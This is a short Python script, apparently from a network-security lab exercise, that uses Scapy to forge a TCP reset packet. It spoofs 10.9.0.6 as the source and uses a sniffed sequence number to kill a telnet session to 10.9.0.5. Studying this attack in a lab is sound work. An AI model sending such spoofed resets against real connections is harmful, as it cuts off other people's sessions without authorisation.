#!/usr/bin/env python3

from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")

# Need to take the seq number (raw) corresponding to the one inside the last packet sent in that direction (in this case from 10.9.0.6 to 10.9.0.5)

tcp = TCP(sport=58018, dport=23, flags="R", seq=4198450972)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)